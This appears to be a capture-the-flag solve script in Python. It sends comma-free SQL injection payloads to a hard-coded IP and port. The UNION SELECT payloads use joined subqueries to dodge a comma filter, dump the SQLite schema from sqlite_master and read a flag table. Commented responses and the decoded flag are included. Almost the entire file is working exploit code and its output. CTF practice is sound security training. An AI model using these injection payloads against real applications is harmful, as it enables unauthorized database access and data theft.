import requests

url = "http://52.59.124.14:5015/?p=2,10 "

# 1.
# payload = "union select * from (select 1)A join (select 2)B join (select 3)C"
#
# === response ===
# 2 (ID=1) has content: "3"
# Page 2 (ID=2) has content: "This is not a flag, but just a boring page."
# Page 3 (ID=3) has content: "This is not a flag, but just a boring page."
# ...

# 2.
# payload = "union select * from (select 1)A join (select 2)B join (select sql from sqlite_master)C"
#
# === response ===
# 2 (ID=1) has content: ""
# 2 (ID=1) has content: "CREATE TABLE flag (id INTEGER PRIMARY KEY, name TEXT UNIQUE, value TEXT)"
# 2 (ID=1) has content: "CREATE TABLE pages (id INTEGER PRIMARY KEY, title TEXT UNIQUE, content TEXT)"
# Page 2 (ID=2) has content: "This is not a flag, but just a boring page."
# Page 3 (ID=3) has content: "This is not a flag, but just a boring page."
# ...

# 3.
payload = "union select * from (select 1)A join (select 2)B join (select value from flag)C"
#
# === response ===
# 2 (ID=1) has content: "RU5Pe1NRTDFfVzF0aF8wdVRfQzBtbTRfVzBya3NfU29tZUhvd19BZ0Exbl9BbmRfQWc0MW4hfQ=="
# Page 2 (ID=2) has content: "This is not a flag, but just a boring page."
# Page 3 (ID=3) has content: "This is not a flag, but just a boring page."
# ...

resp = requests.get(url + payload)
print(resp.text)

# ENO{SQL1_W1th_0uT_C0mm4_W0rks_SomeHow_AgA1n_And_Ag41n!}
